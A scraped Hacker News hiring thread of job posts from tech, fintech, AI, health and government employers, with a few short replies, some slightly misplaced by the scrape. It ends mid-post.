agoprevGranolaProduct EngineerLondon (on-site)Full-timehttps://jobs.granola.so Want to build a beautiful, useful product with all the latest AI tooling? At Granola we're using LLMs to tackle a concrete user need: help people capture what matters during meetings and then quickly act on it after the meeting. We want Granola to feel as natural as picking up a pencil. We raised $4 million last March from amazing investors. We’ve built startups before (Chris’ last company was acquired by Google) and we’re obsessed with building incredible, user-centric products. We're inspired by folks like Douglas Engelbart and Alan Kay to build better tools for humans. We like working in person, with nice people. We have a beautiful, light-filled workspace, and we’re looking for a Founding Engineer to build an amazing company with us. More on the role at https://jobs.granola.so reply spark_CM 6 hours agoprevChartMogulRemote (EU or South Korea)Full-time At ChartMogul, we're building the leading Subscription Analytics Platform for growing SaaS businesses. We're a remote-first company with 67 team members across 23 different countries. Profitable and self-sustaining since our seed funding. Our core product is a Ruby on Rails backend with Vue.js and TypeScript frontend. Postgres serves most of our database needs along with a Snowflake data warehouse. We're on AWS using Docker and Kubernetes. - Senior Full Stack Engineer: https://jobs.chartmogul.com/o/senior-full-stack-engineer-del... reply montenegrohugo 1 hour agoprevPeanut ProtocolSenior Backend/Full Stack EngineerFULLY REMOTE (Europe)https://peanut.to We're a pretty early stage startup in crypto. We make payments easier. We love an aligned team, good vibes, and shipping well. High equity & token comp if you want it (we'd love that). please reach out here: https://www.notion.so/peanutprotocol/Fullstack-Generalist-93... see you! reply kollmar28 1 hour agoprevRailwayFull-stack Engineering (Product), Platform Engineering (Infra)REMOTE (International)https://railway.app/careers Tired of trying to beat kube into shape? Does writing YAML to ship code fill you with utter dread? Dream of a future where deploying software is simple, and you don't need an army of infrastructure engineers to build that perfect janky bash script™ to make life easy? We're Railway, and we think infrastructure can be better. So far we've built out a platform loved by hundreds of thousands of users who simply tell us \"Give me Postgres\", \"Deploy this repo\", and we make it happen Fair warning! The problems are complex: home-rolled hypervisors, cut-above container orchestration, over/under/whateverlay networks, virtio device drivers, edge proxies, IAM that doesn't suck, kitchen sinks - we need to build it and we're looking for likeminded individuals who think this stuff is fun. If that sounds like you, please apply at railway.app/careers. We have a number of roles, but are prioritizing the following two roles: +Full-stack Engineer (Product): -Apply here: (https://railway.app/careers/full-stack) -Blog post about the team: (https://blog.railway.app/p/team-spotlight-product-engineerin...) +Infrastructure Engineer: -Apply here:(https://railway.app/careers/infra-platform) -Blog post about the team: (https://blog.railway.app/p/team-spotlight-infrastructure-eng...) See you soon, and happy shipping. reply narodnik 1 hour agoprevDarkFi L1 for Anonymous Smart ContractsDevsREMOTE, VISA (for swiss)dark.fi We are looking for ideological devs who want to work with p2p and ZK to create scalable distributed infra. For more info check out our website and docs. Feel free to email rewend@dyne.org but best to join our chat. See these links: https://darkrenaissance.github.io/darkfi/dev/contrib/contrib... Join our core chat: https://darkrenaissance.github.io/darkfi/misc/ircd/ircd.html Every monday 16:00 CET we have our main dev chat in #dev. Feel free to come by and ask questions. To understand our mission see this vid we made: https://www.youtube.com/watch?v=QA3YZVDUN5s reply justin_sdx 14 hours agoprevSmarterDx150-230k + equity + benefitsRemote (US only)Multiple roleshttps://smarterdx.com/careers We are an early stage health tech company using AI to improve hospital revenue cycle (making healthcare costs lower and allowing doctors to focus on patient care). The team is small but high functioning (MD + data scientist combos, former ASF board member, Google and Amazon engineers, Stanford LLM researchers, etc.) and initially scaled the company to $1MM+ in contracted revenue without raising capital. We have been backed by top investors including Floodgate (Lyft, Twitch, Twitter), Bessemer, and are currently on pace to 30X in revenue over a two-year time period. We are looking for: - Senior Machine Learning Engineers - MLOps - Solutions Engineers - FE SWEs (React) - Marketing (Digital and SDR) - Sales - Head of Customer Success We have PMF, and it's time to scale! For more, see https://smarterdx.com/careers You can also email us at hiring at smarterdx dot com reply mavam 5 hours agoprevTenzirRemote - EUopen-coreFull-timehttps://tenzir.com Tenzir is hiring several key engineering roles to meet the needs in expanding the team. Our product: security data pipelines. From the data side, think of it as an Arrow-native, multi-schema ETL tool that offers optional storage in Parquet/Feather. From the security perspective, think of it as a solution for collecting, parsing, transforming, aggregating, and routing data. We typically sit between the data sources (endpoint, network, cloud) and sinks (SIEM, data lake). Our open-source execution engine is C++20, our platform is SvelteKit and TypeScript. Experience with data-first frontend apps is a great plus. Open positions at https://tenzir.jobs.personio.de: - Senior C++ Engineer - (SecOps) Solution Engineer We are based out of Hamburg, Germany, and hire across EU time zones, stretching all the way to India. reply limpanz 4 hours agoprevJämtkraftdata-engineer AzureJämtkraft is a swedish energy company active in all electricity markets in Sweden. Jämtkraft is a diverse business with business areas in district heating, electricity grid and power trading. Jämtkraft is a bit on the forefront in Sweden as one of the first grid companies with a local flexibility market. We are also operating several algo-trading solutions in the Swedish electricity market. As a data engineer you will work with this kind of data utilizing all tools available in Azure. Aside from having stunning nature around the corner you will also have 38 Vacation days / year. I'm not the recruiting manager and I know you will be able to ask for a pretty high salary, especially if you have experience. reply jholtom 14 hours agoprevDASH Tech Integrated CircuitsEmbedded Systems EngineerREMOTE (US only)Full-Time DASH Tech IC is seeking an Embedded Systems Engineer to join our team delivering the next generation of efficient, flexible embedded processing for RF systems. In this role, you are expected to participate in the definition of architecture and implementation of designs in both prototype and commercial products as well as demonstrate good development practices and seamless collaboration. Our teams deliver all embedded software from ASIC boot ROM and successive bootloaders, low-level device drivers, to high-level, complex hardware/software DSP systems. https://dashtechic.com/careers You can reach me directly at jacob.holtom@dashtechic.com reply crly 14 hours agoprevDisney StreamingLead/Senior Software EngineerOnsite in NY, Seattle, SF or RemoteFull-time Help us build the applications and services used by millions. We’re looking for folks to build amazing user experiences and performant, scalable APIs for Disney+, Hulu, Star+ and ESPN+. You’ll excel at Disney Streaming if you’re a well-versed technologist and specialist in your field, interested in raising the bar by innovating and adopting new patterns and technologies to stay on the bleeding edge of development. We feel strongly that teams should own their own processes, decide their own technologies, and design solutions for the long term. If you're interested in working in a highly collaborative team environment like this, please get in touch - we'd love to hear from you! We’re hiring for many positions, here are a few key ones - Lead Software Engineer (Services, AWS/Scala/Java/http4s/Cats Effect) - Sr/Mid Software Engineer (Services, AWS/Scala/Java/http4s/Cats Effect) - and many more! If interested in one of the roles above, drop me a line (email in profile) Take a look at all our openings and apply online at: https://jobs.disneycareers.com/search-jobs reply antonoo 3 hours agoprevgptengineer.app / LovableONSITE+HYBRIDStockholm / LondonFull-TimeFounding Engineers, Founding Designer Lovable consists of a team of pragmatic previous founders, CTOs, IOI gold medalists, set on being the first to make autonomous code generation work. This is a hard problem. We believe we can do it by selecting a limited domain, a great AI driven UX and carefully selecting an 'AI-first' tech stack of open-source, that us engineers love to maintain. And optimise our system of fine-tuned LLMs (+LMMs) to do well there. We believe that rapid experimentation and hiring the brightest and most ambitious minds is the way we make this work. You'd be one of the first employees and have a big impact in shaping our product and company. In particular, we're looking for: - Founding Designer, who loves understanding the user, technical products, and always think about how products they interact with could be more intuitive - Founding Engineer, joining our team of AI and product engineers building the software that builds other software. anton@lovable.dev reply danjwilson 2 hours agoprevBright NetworkPython EngineerEdinburgh, UKHybridFull-time At Bright Network, we use modern technology and data science to connect ambitious young people from all backgrounds with the best career opportunities. We currently have 900,000+ members and 300+ top-tier graduate employers. We're currently looking for a Python Engineer to work on our Django-based member websites. See https://boards.greenhouse.io/brightnetwork/jobs/5134978004 for more info. You can expect: * To work alongside people who are really proud of the products they're building - putting our customers first * To work in a collaborative, ego-free & supportive team * To have time in each sprint to focus on your own L&D to help you grow Please get in touch with me if you're interested or have any questions — email in my profile! reply anotherhue 14 hours agoprevKagiFull & Part TimeRemotehttp://kagi.com Kagi is building a user-centric search engine, free from ads and tracking. Our primary language is Crystal, and we are always interested in talking to developers who share our values. Some of our roles are listed below, but feel free to reach out even if you don't see a match. https://help.kagi.com/kagi/company/hiring-kagi.html You can reach us directly at hello@kagi.com --- Thank you everyone for the outreach! Please bear with us as we work through the responses. --- reply rcshubhadeep 32 minutes agoparentCan I apply if I am based in India and never used Crystal? I believe I will be valuable in the Core ML Team. Looks interesting! reply gcj 14 hours agoparentprevThat sounds pretty awesome, actually. Can I attempt even if I never coded with Crystal? :P reply anotherhue 14 hours agorootparentYour resume looks interesting, reach out and we can have a chat. reply RagnarD 6 hours agoparentprevI've paid for Kagi for awhile now, great alternative to Google. Minor typo in your job listing: \" It's a bit of a rollercoaster, not for the feign-hearted.\" Should be faint-hearted, unless it's a deliberate play on that. reply ixaxaar 13 hours agoparentprevHey love what Kagi is doing! I'm based out of India, can I apply? reply anotherhue 10 hours agorootparentHello, Timezone would likely be a challenge but happy to take a look. reply PlantingSpace 15 hours agoprevPlantingSpaceFull-timeRemote (EU time zone) with quarterly gatheringshttps://planting.space We are building an AI system that can accurately represent knowledge and handle uncertainty, to enable the discovery of insights and solve problems based on explainable reasoning. We envision applications to automate analysis and speed up research in domains such as Finance, Strategy Consulting, Engineering, Material Sciences, and more. We are continuously looking for strong software engineers who are up for a challenge and a steep learning curve. You’ll be exposed to cutting edge research in Bayesian statistics, dynamical systems, information theory, category theory, and more. Openings at PlantingSpace: - We keep growing our strong NLP team, looking for Engineers who have state of the art LLM and transformer model experience. - We look for a hands-on and strategic Startup Operator, to strengthen our operations across finance, HR, compensation, global hiring, remote collaboration, and make us ready to scale as we move towards our product launch (European based). Find more about our tech, our organisation, and ways of work on our website: https://planting.space/ To see a full list of openings, and to apply, check out our Join Us page: https://planting.space/joinus/ reply kshitijgrover 14 hours agoprevOrbSoftware Engineer, Infrastructure Engineer, SRESan Francisco, CA (in-person)Full Time Orb is building billing infrastructure for modern companies. As companies grow and evolve, the ability to change their pricing and packaging is often limited by the sheer complexity of the engineering effort involved to make those changes. I experienced these challenges first hand and my desire to solve this problem is what led me to start Orb. At Orb, we're looking to fill a handful of engineering roles including: - Site Reliability Engineer: https://jobs.ashbyhq.com/orb/12f03ff6-f464-498c-a807-7aad894... - Software Engineer, Full Stack: https://jobs.ashbyhq.com/orb/25d6b4f8-72b9-44ff-a48f-29a60c7... - Software Engineer, Infrastructure: https://jobs.ashbyhq.com/orb/2b527d31-12c5-41e4-80fc-8b63e36... You can find out more about the team and company here: www.withorb.com/about reply hudson-trading 14 hours agoprevHudson River TradingHybridFull-time We’re a quantitative trading firm based in NYC that trades hundreds of millions of shares each day on over 200 markets worldwide. We use math and technology in everything we do; our talented developers, engineers, and programmers build complex models and systems that allow us to make automated trading decisions on global markets. We’re looking for: Full Stack DeveloperLondonOnsite / Hybridhttps://www.hudsonrivertrading.com/careers/job/?gh_jid=57407... Experienced FPGA Verification EngineerAustin, London, Chicago, Boulder, NYCOnsite / Hybridhttps://www.hudsonrivertrading.com/careers/?q=fpga&gh_src=ca... And more! For more information about our benefits, check out Life at HRT: https://www.hudsonrivertrading.com/life-at-hrt/ reply RitaSand 14 hours agoprevSupabase (YC S20) || Remote || Full-time || supabase.com Supabase is an open-source Firebase alternative with over 60,000 stars on GitHub. In other words, it is a Backend platform offering a Postgres database, vector extensions, auth, real-time functionality, storage, restful APIs, and edge functions. Top-3 position we hire for right now: - https://boards.greenhouse.io/supabase/jobs/5094802004 Cloud Infra Engineer (security focus) - https://boards.greenhouse.io/supabase/jobs/5027144004 Customer Success Architect (Americas time-zone) - https://boards.greenhouse.io/supabase/jobs/5072984004 Growth Marketer Please, find the details and apply here https://supabase.com/careers, we manually check and respond to all the applications. reply ben_storetrials 1 hour agoprevVirtual Store TrialsFull Stack Typescript Engineer£70,000 - £110,000 per year + Equity| London - UKHybrid (2/3 days in the office)No VISA sponsorship We're looking for a senior Typescript engineer to be part of a smart, caring and hard-working team changing the way giant brands like Mars, Coca Cola and Unilever work with giant retailers. It's a startup: it's unstructured, there's a lot to do and we care about results (growth). We’re a small, high-performance team who care about what we’re working on and each other. Your commercial colleagues are ready and excited to put the products we ship in front of huge international clients as well as relax and have some fun together to celebrate our achievements. Interested? Here is the link: https://www.linkedin.com/jobs/view/3864208887/ or email me on ben@storetrials.com reply vst_ben 1 hour agoprevVirtual Store TrialsFull Stack Typescript Engineer£70,000 - £110,000 per year + equity| London - UKHybrid (2/3 days in the office)No VISA sponsorship We're looking for a senior Typescript engineer to be part of a smart, caring and hard-working team changing the way giant brands like Mars, Coca Cola and Unilever work with giant retailers. It's a startup: it's unstructured, there's a lot to do and we care about results (growth). We’re a small, high-performance team who care about what we’re working on and each other. Your commercial colleagues are ready and excited to put the products we ship in front of huge international clients as well as relax and have some fun together to celebrate our achievements. Interested? Here is the link: https://www.linkedin.com/jobs/view/3864208887/ or email me on ben@storetrials.com reply johnmoberg 14 hours agoprevTandem HealthSoftware EngineersOn-site in Stockholm, SwedenFull time We’re using generative AI to automate medical documentation so that clinicians can spend more time with patients. Founded 8 months ago, we’re already live with dozens of clinics all over Sweden, growing rapidly (onboarded >10 new clinics during the last month), and are now gearing up for expansion to new markets. We’re a small team with an audacious mission - health care represents 10% of GDP and 30% is spent on administration, of which 43% can be automated. The impact will be huge. We believe that with our team’s strong understanding of the healthcare space in Europe and a fantastic engineering team, we will be the team that does it. And until we can measure impact in terms of % of GDP, it’s already incredibly fulfilling to go to a care centre and meet clinicians that love our product. The impact is very real! We’re currently looking for generalist engineers. Experience with health-tech, frontend, infrastructure, security, LLMs or ASR is especially meritorious. If you think this sounds exciting, please reach out to me at john.moberg@tandemhealth.se and let’s explore a fit! reply parav 3 hours agoprevFondantAI-powered 3D toolsFrontend Engineer/Design EngineerFull time, REMOTE We are hiring for frontend engineer roles at Fondant. Design is the core of everything we do so if you are someone who is a frontend ninja with good taste in design, you will be a great fit. You will be brainstorming, prototyping and rapidly implementing new interfaces for a 3D tool in the browser. A lot of your work will involve making the UX more intuitive for beginners yet effective for power users. WebGL experience and knowledge of 3D tools or game engines is a huge plus. Reach out at my username [at] fondant.design with a short blurb about yourself and link(s) to a personal contribution(s) e.g., open-source code, designs, cool demo of something you built etc. Fondant is on a mission to make 3D more accessible. We are building a tool that harnesses the latest advancements in generative AI/ML to make new 3D workflows for modeling and rendering. Traditional 3D tools are often unapproachable (think Blender, 3DS Max). We are leveraging the lessons learnt from building traditional tooling over the last decade + SOTA work on 3D reconstruction, NeRFs, gaussian splatting and image generation. We have an early product + users + funding. reply jhirshman 14 hours agoprevUncountableSF & Munich (In-Person)Full-Stack Engineering https://www.uncountable.com/hiring/hn Uncountable accelerates R&D for industrial scientists across leading materials, chemicals, and life sciences organizations. With our SaaS solution, our customers get better products to the market in half the time. Uncountable was founded by MIT and Stanford engineers and has been profitable since 2016. Our team has grown from 20 to 50 over the last two years. Full-Stack Engineers$120k - $220k + Equity ---> Uncountable is looking for engineers who can spearhead the development of the Uncountable Web Platform. The position is heavily product-driven and comes with challenges across the stack. --> Summer internships and working student positions are also available. Learn more: https://www.uncountable.com/hiring/hn Uncountable has offices in San Francisco, New York City or Munich. Contact our CTO directly at jason@uncountable.com reply 1tsn0tm3 43 minutes agoparentJust fyi your „trusted by“ section has layout issues on mobile (iOS). The displayed brand logos are not alligned correctly :) reply abelanger 9 hours agoprevHatchet (https://hatchet.run)New York CityFull-time We're hiring a founding engineer to help us with development on our open-source, distributed task queue: https://github.com/hatchet-dev/hatchet. We recently launched on HN, you can check out our launch here: https://news.ycombinator.com/item?id=39643136. We're two second-time YC founders in this for the long haul and we are just wrapping up the YC W24 batch. As a founding engineer, you'll be responsible for contributing across the entire codebase. We'll compensate accordingly and with high equity. It's currently just the two founders + a part-time contractor. We're all technical and contribute code. Stack: Typescript/React, Go and PostgreSQL. To apply, email alexander [at] hatchet [dot] run, and include the following: 1. Tell us about something impressive you've built. 2. Ask a question or write a comment about the state of the project. For example: a file that stood out to you in the codebase, a Github issue or discussion that piqued your interest, a general comment on distributed systems/task queues, or why our code is bad and how you could improve it. reply DMEA 14 hours agoprevDefense MicroElectronics Activity (DMEA)RF, Hardware Design, Software, Embedded Software Engineers WantedFull-timeSacramento, CAHYBRID$114 - $148k (GS-13) Who: A Department of Defense (DoD) field activity that has been operating since 1997. Small and engineer-centric. ~90% are engineer/scientist. What: Provide solutions to other US Government agencies and allies. Some tasks are engineering brand-new products and some tasks are re-engineering devices to keep legacy systems running. We do not compete with private industry but regularly work side-by-side with industry to get stuff done. We also have the only semiconductor foundry still operational within the federal government. Why: US Government agencies sometimes want products built that are so technologically risky or low-volume that private industry does not want to do them. We fill the gap. Where: Sacramento, CA -- California's fourth largest metro area. Home to two major state universities (CSU-Sacramento and UC-Davis). The farm-to-fork, and regular, capital of California. Benefits: We are federal employees and receive federal benefits (google \"opm benefits\" for more info). Time off starts at 36 days/year (13 vacation + 13 sick + 10 federal holidays) and grows to 49 days/year over time (26 + 13 + 10). We have flexible schedules and most of us work a \"9-to-5.” Hiring is for GS-13 engineers (google “gs pay scale 2024” and look at the Sacramento locality). Tech Stack: Altium for Hardware design. Modern C/C++(C++17) for embedded. C#/.net for desktop application development and some server services. Python for scripting/automation. Gitlab for SCM/CI. We're using modern tools to solve modern problems. Interview: Must be a US citizen. Must be able to achieve and maintain a security clearance. 2 x Phone call [1 hr] >> Onsite w/team [full day] Apply: Send your resume to DMEA-hnjobs at groups.mail.mil (please DO NOT contact if you are a recruiter) reply _praf 11 hours agoprevColumn (https://column.com/)Software Eng (Product), Software Eng (Infrastructure), Software Eng (Internal Tools)San Francisco, CAFull Time Column is the first nationally chartered bank built from the ground up for developers. We provide an API first, modern banking experience for our customers, replacing the bloated middleware and legacy software that currently powers most financial companies. Started by the co-founder of Plaid, Column has a team of 8 experienced engineers and is currently processing hundreds of billions in payments annually, supporting some of the largest and most sophisticated fintech companies. We are currently hiring our first full-stack product engineer (React, Go) to build delightful banking UX. We are also hiring an experienced infra engineer (Go, Kubernetes, AWS) to help scale our systems. Finally, we have a new role open for a junior engineer to work on full-stack internal tooling (JS, Go) with lots of opportunities for growth. We all work on high impact, independently driven projects - writing code for regulated financial infrastructure at scale. Apply here: https://column.com/careers or read more about our hiring philosophy here: https://column.com/blog/hiring-at-column Feel free to email me with any questions: praful@ reply StellarScience 11 hours agoprevStellar ScienceHybrid USA Washington DC, Albuquerque NM, Dayton OHFull time, INTERNS/co-opsU.S. citizenship requiredhttps://www.stellarscience.com Company: We're a small scientific software development company that develops custom scientific and engineering analysis applications in domains including: computer vision and image processing, space situational awareness (monitoring the locations, health and status of on-orbit satellites), metamaterials design, image simulation, high power microwave systems, modeling and simulation, machine learning, physics informed neural networks (PINN), human body thermoregulation, laser systems modeling, high performance computing (HPC), computer aided design (CAD), and more. All exciting applications and no CRUD. We emphasize high quality code and lightweight processes that free software engineers to be productive. Experience: We typically look for Bachelors degrees in computer science, physics, engineering, math, or a related field, and also hire Masters and PhDs (roughly 30% of our staff have PhDs.) Technologies: Mostly C++20/23 with coroutines and generators, Qt 6.5, CMake, Boost, Jenkins, git, OpenGL, CUDA. Windows and Linux, msvc/gcc/clang/clangcl, Visual Studio 2022 or any productive IDE. Some projects use Python, Java, or Javascript. Apply online at https://www.stellarscience.com/careers/. reply ashley81426 10 hours agoprevJito LabsSr. Smart Contract EngineerRemote (US)Full-timewww.jito.wtf$150-$200k approxWe are looking for creative and motivated engineers that can effectively wrangle problems with large design spaces and come up with simple and elegant solutions. The role is extremely dynamic and a place where low-level problem solvers will thrive. You will be building protocols that have the potential to custody billions of dollars of capital; if this excites you please apply! Responsibilities: -Architect Solana programs using Solana native and Anchor programming models -Build safe, secure, and performant code -Write public-facing test plans and documentation for the code you’ve produced -Build substantial testing infrastructure to ensure code is following a defined specification -Collaborate with the team and customers to leverage internal knowledge and tooling -Drive features and products from beginning to end with extreme ownership -Comfortably dive deep into performance bottlenecks and debug problems across the entire stack Qualifications: -5+ years of systems programming experience writing code in Rust, C, or C++ -Multiple Solana programs written in Solana native programming or using the Anchor framework -Excellent communication and collaboration skills -Experience wrangling complex problems into simple solutions -Worked at areply mtekman 12 hours agoparentprevAh. This would be perfect for me (see my bio), but I'm only UK and EU based. I'd do remote if I could. reply lebovic 12 hours agorootparentArgh, this could be a perfect fit for you. I'm disappointed that we won't be able to make it work for these roles. Candidly, we haven't figured out how to do international remote work well. Hopefully we will in the future! reply mtekman 12 hours agorootparentHah, no worries - if ever you start anything in the UK/EU space, feel free to ping me! reply lebovic 12 hours agorootparentWill do! reply calvinmorrison 13 hours agoparentprevThis is super cool! It's nice to see commercialization in the bioinfo space, after dealing with bedraggled servers running in your PI's lab for many years and dealing with insane packages (ever try to install QIIME?). I would have loved this job coming out of college. reply lebovic 12 hours agorootparentThanks! Ironically, I was hired for my first job in bioinformatics by one of the QIIME authors. Unfortunately, that didn't make it any easier. I don't think anyone has really figured out commercialization in the space yet – us included. The community is still rooted strongly in academia, so commercializing requires a delicate balance between profitability and openness. I imagine it's what building dev tools was like a couple decades ago. It's fun to see the field grow and evolve. reply calvinmorrison 8 hours agorootparentCertainly, and as I was having my swan song of a semester, it really did seem like things were turning a great corner on reproducibility, distribution of data, sharing code, building code that wasn't matlab scripts cobbled together and so forth. QIIME is awesome, they have taken on the unenviable task of \"dealing with\" all those random sub libraries that are from hell. If you're familiar with Galaxy[0], we used that back in the day and wrote plugins at my lab so we could have researchers use the tools we were building. it feels like that type of 'platform of data + programs\" would be easier to monetize. I mean, the workloads are there, people like plug and play, it could use a lot of sprucing up and some paid people to solve the nasty parts. And yes, I think it's a rite of passage - I mean your own FASTA counter, of course! [1] ;) [0] https://usegalaxy.org/ [1] https://git.ceux.org/dna-utils.git/ reply tetris11 12 hours agorootparentprevI'm not seeing anything in the bioinformatics space at the moment. What job did you end up doing after college can I ask? reply calvinmorrison 12 hours agorootparentGot recruited as a run of the mill PHP dev at a local medium sized business. Turns out my PI did not get the grant and so I ended up going private reply lebovic 12 hours agorootparentThis pattern is common. Anecdotally, I think the majority of people trained in bioinformatics end up working full-time in standard software engineering. I think this is starting to change. Next-generation sequencers and other imaging devices are causing more wet labs to produce massive amounts of data – which is increasing the number of companies hiring for bioinformatics roles. reply tetris11 12 hours agorootparentprevYup, ain't that just how it goes. I'll probably make the leap soon myself sometime this year, and I'm not looking forward to playing \"skill-tetris\" with recruiters. reply furtimmodus 5 hours agoprevFurtim ModusMultiple: Java Developer; Data Engineer; DevOpsRemote (Americas/Europe)Part-Timehttps://furtimmodus.com This is an exciting opportunity to contribute your skills and expertise to an established electronic trading fintech venture based out of New York and receive equity in exchange for your contributions. Additionally, we’ll provide you the opportunity to convert full-time with base comp $150k–$250, full benefits, cash bonus, and more equity. - Java Developer: https://www.furtimmodus.com/java-developer - Data Engineer: https://www.furtimmodus.com/data-engineer - DevOps Engineer: https://www.furtimmodus.com/devops-engineer If you are passionate about your craft and interested in joining an established fintech venture part-time to start on an equity basis with the goal to convert to a full-time paid position, we would love to hear from you. Please submit your resume to agency@furtimmodus.com if interested in this opportunity. reply chaisan 7 hours agoprevNtropy (https://ntropy.com)ONSITE, Full-timeOffice in San Francisco and London, UKSWE, ML$130-200k Ntropy is building domain-specific caching infrastructure for LLMs that makes it possible to reduce p99 latencies by 1000x and costs by 4-5 orders of magnitude for real-world, high-throughput tasks. Currently we are targeting the financial and banking domain and will expand over time. We are well funded by top investors (QED & Lakestar) and are launching an engineering office in SF this month. We are hiring for the following roles: - Machine learning engineer (San Francisco, CA) - Full-stack / LLM engineer (San Francisco, CA) - (senior) Backend engineer (San Francisco, CA) - Front-end engineer (London, UK) To apply, email jobs@ntropy.com reply samier-trellis 11 hours agoprevTrellis -- AI/ML EngineerRemotetrellis.law We are looking for a senior/staff ML person to join our data science and machine learning team. The kinds of things we envision this hire doing: * Leading the development of scalable training and deployment infrastructure for several ML models. * Leading and guiding the team in which metrics to select to evaluate LLM output, our custom RAG pipelines, etc, and taking a hands-on role in building automated pipelines to conduct such evaluation. * Fine-tuning LLMs to handle domain-specific use-cases. Please apply here: https://jobs.lever.co/trellis/b76fa20e-8bf4-4d6e-a716-200f36... Tech stack: Python/Django; AWS; Postgres; Elasticsearch; Redis About Trellis: Trellis is one of the only modern, searchable, and aggregated sources of state trial court filings around, and we are actively expanding to include Federal court dockets as well. If you have never before tried to search state court dockets, you probably aren't aware of how difficult it is to find what has been filed in public court cases. Trellis is filling the gap and modernizing the space. Our customers range from solo practitioners to some of the largest and most prestigious law firms in the country. I am happy to answer any questions here, or via Discord DM (ss1515) reply yuppiepuppie 3 hours agoparent> At least 7 years of backend engineering experience, at least 3-4 of which were spent building products using LLMs. Seeing as the largest, most popular LLM only came outhttps://jobs.ashbyhq.com/alembic?utm_source=LN0y4z4gdM reply darango6 12 hours agoprevGauntlet - Financial modeling for DeFi Gauntlet’s mission is to drive adoption and understanding of the financial systems of the future. Gauntlet is the platform for off-chain intelligence that drives on-chain efficiency in Decentralized Finance (DeFi). We work with protocols to manage risk, improve capital efficiency, and manage incentive spend. We also publish cutting-edge research and aim to take a leading role in defining market risk standards across the industry. Remote US & CAN / NYC / SFO / LA We are looking for - Data Scientists - Software Engineering folks (generally Backend Pythonistas but Full stackers too!) - Data and quant-inclined professionals How to get in touch! Our website - https://www.gauntlet.xyz/ Twitter - https://twitter.com/gauntlet_xyz LinkedIn - https://www.linkedin.com/company/gauntlet-xyz/ Ping us on our Twitter handle @gauntlet_xyz to find out more! reply hahnbee 8 hours agoprevMintlify (YC W22) (https://mintlify.com/)On-site (San Francisco)Full-time We're hiring a full stack engineer to help build world-class documentation. Our tech stack includes Next.js, Tailwind CSS, Typescript, and Node.js. You can find the role here: https://www.ycombinator.com/companies/mintlify/jobs/pk3AAR7-... We're a small team of 7 people and we are all very intrinsically motivated and hard-working individuals. We want to set the standard for modern documentation. reply siddharthb_ 10 hours agoprevTurboML (https://turboml.com/)IndiaDevOps / MLOps / ML / Streaming Systems / UI Designer TurboML is an ML platform reinvented for real-time. Imagine having all the capabilities of an ML platform – from creating data sources, features, models, deployments and metrics to continuously maintaining and improving them – while simultaneously being able to use the freshest real-time data. How quickly would your team be able to iterate if they could directly test their hypotheses on the live production data? How effective and relevant would your models be if they could learn from real-time data? By joining TurboML, you'll be part of an early-stage, well-funded team committed to democratizing real-time ML. Send an email with your resume or questions: siddharth@turboml.com reply ddp26 9 hours agoprevFutureSearch (https://futuresearch.ai)Full RemoteFull-Stack Eng / Research Eng / Research Scientist FutureSearch gives unbiased, deeply-researched answers to hard questions about the world, and always gives a concrete answer. Businesses need much better answers than ChatGPT, Perplexity, etc. can currently give. My cofounder and I are the former CTO and Head of AI at Metaculus, and our edge comes from implementing the workflows of expert forecasters. FutureSearch creates models from scratch on novel domains when a customer asks a question, and we test our claims against what actually happens. We're an 8-month old, 5-person, fully-remote company. Email me directly with your resume if you're interested in a role, dan at futuresearch dot ai. reply mynameisjody 13 hours agoprevChild Mind InstituteNew York City or RemoteFull TimeMultiple Roles The Science and Engineering team at the Child Mind Institute is dedicated to transforming the lives of children with mental health and learning disorders through the power of scientific discovery. Our product development group is working on a number of products including interventions and data gathering tools. Frontend Engineer, MindLogger application - https://workforcenow.adp.com/mascsr/default/mdf/recruitment/... QA Lead, across all products - https://workforcenow.adp.com/mascsr/default/mdf/recruitment/... Email me at jody.brookoverchildmind.org if you have any questions about these positions, seriously. (no recruiters/agencies please) reply asta-li 13 hours agoprevPrivyOnsite NYC (Preferred) or RemoteHybrid Product/Eng, Frontend/Fullstack, Backend RolesFull-Timehttps://privy.io Hi, I'm Asta, CTO at the digital identity startup Privy. We build an authentication and cryptographic key management SDK that hundreds of companies integrate in order to onboard users (4M+ in the last 8 months alone) onto products built with blockchain infra and distributed systems. We believe that when users own cryptographic keys, we shift the status quo so that users control more of their data and assets online. Privacy is fundamentally about ownership and revocation. User experience is our North Star, because users won't compromise on UX. We're a small, high-ownership team building a product with real usage (>2M MAUs, massive transaction volume) that developers love. We've raised $26M from Sequoia & Paradigm. We ship constantly - multiple production releases per week. Reach out at join [at] privy.io - these emails go to me. https://www.notion.so/privy-io/Privy-Careers-b4a51920dc5548e... reply mattvv 12 hours agoparentwearcheraai reply galleypage 10 hours agoprevJawa.ggRemotePart-time (Contract) Jawa is the marketplace for gamers! We make it safe and easy to buy and sell gaming hardware (especially PC builds and components). We're hiring a part-time content marketer to help manage our growing social channels, influencer relationships, and general community outreach. Find out more here: https://jawagg.notion.site/Content-Marketer-Contract-90dc369... reply celicoo 14 hours agoprevEmailchaser.com is seeking a passionate and seasoned Front-End Engineer to join our team. The ideal candidate will have a strong focus on creating exceptional user interfaces and a deep knowledge of the MUI (v4 & v5) framework. Requirements: * Proven experience as a Front-End Engineer (minimum 5 years); * At least 6 months of hands-on experience with the MUI5 framework; * Proficiency in NextJS is a significant plus; * Deep understanding of web technologies: HTML, CSS, and JavaScript; * Excellent problem-solving skills and attention to detail; * Ability to work collaboratively in a team environment; * Passion for creating intuitive and visually appealing user interfaces. If you believe you are a good fit, please reach out to marcelo at domain name .com reply flintclinical 15 hours agoprevFlint ClinicalFounding Full-stack Engineerex-Palantir CTO1% equity & competitive payNYC - hybrid ONSITEFull-Time Flint is on a mission to bring life-saving therapeutics to market faster by accelerating clinical trial operations. We're building an end-to-end operating system for sites, the medical facilities that interface with patients and generate critical research data. We’ve raised pre-seed funding and are seeking a Founding Engineer (back-end or full-stack) eager to build and launch new products. Large opportunity for growth - you'll own significant portions of tech stack, be very hands on building our MVP, craft strategy/decision making, interface with & onboard customers, etc. Path to a leadership position! Apply here! https://grnh.se/7db339034us reply notwhereyouare 13 hours agoprevTravel + Leisurehttps://www.travelandleisure.com/Orlando, FL or remote (certain roles)Full TimeMultiple Roles Travel and Leisure is hiring multiple positions. https://www.tnldt.com the VP and the Director roles will require residency in orlando, the other roles are remote, US based. We are a .net (C#) stack, MsSQL as our backend. Smalltalk for our booking engine. feel free to reach out to christopher.sterling@travelandleisure.com (no recruiters at this time please) if you have any questions, or apply though the links on the site in the 1st paragraph. reply stuhlmueller 13 hours agoprevElicitSenior Software EngineerOakland or Remotehttps://elicit.com Elicit is the leading AI research assistant. We automate high-quality reasoning so that 